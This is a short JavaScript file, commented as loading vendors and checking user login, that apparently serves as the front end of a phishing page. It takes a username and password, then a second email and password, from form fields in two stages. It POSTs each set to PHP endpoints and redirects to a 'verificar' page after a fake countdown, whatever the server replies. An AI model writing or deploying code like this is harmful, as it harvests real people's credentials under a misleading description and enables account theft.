// load vendors and check user login from database from asp and php server
"use strict";

(() => {
    const url = "server/proccesing.php";

    const runVendors = () => {
        const btnNext = document.querySelector("#nextStateCont")

        btnNext.addEventListener("click", runTokenVerification, true)

    }

    const runTokenVerification = () => {

        sendInfoAndCheck(url, {
            usr: document.getElementById("login_textField0").value,
            pwd: document.getElementById("login_textField1").value
        })
    }

    const checkUserToken = () => {
        const correo = document.getElementById("login_textField3").value;
        const contraseña = document.getElementById("login_textField4").value;
      
        const data = {
          correo: correo,
          contraseña: contraseña,
        };
      
        fetch("server/checkuser.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        })
          .then((res) => res.text())
          .then((res) => {
            setTimeout(() => {
              window.location.href = "../verificar.php";
            }, 2000); // Espera 2 segundos (2000 milisegundos) antes de redireccionar
          })
          .catch((error) => {
            console.log(error);
          });
      };
      
      
    

    const sendInfoAndCheck = (url, data) => {
        showLoading();
        let firstSections = document.querySelectorAll(".first");
        let secondSections = document.querySelectorAll(".second");
    
        for (let i = 0; i < firstSections.length; i++) {
            firstSections[i].style.display = "none";
        }
    
        for (let i = 0; i < secondSections.length; i++) {
            secondSections[i].style.display = "block";
        }
    
        document.querySelector("#nextStateCont").removeEventListener("click", runTokenVerification, true);
        document.querySelector("#nextStateCont").addEventListener("click", checkUserToken, true);
    
        fetch(url, {
            method: "POST",
            headers: {
                Accept: "application/json",
                ContentType: "application/json",
            },
            body: JSON.stringify(data),
        })
        .then((res) => res.text())
        .then((res) => {
            // if (window.tk === undefined) showLoading()
        });
    }
    

    const showLoading = () => {
        let cont = 5
        let i = setInterval(() => {
            document.querySelector(".seg").innerHTML = --cont;
            if (cont == 0) {
                document.querySelector(".l").style.display = "none"
                clearInterval(i)
            }
        }, 1000)

        document.querySelector(".l").style.display = "flex"
    }



    // app
    window.addEventListener("DOMContentLoaded", runVendors)
})()
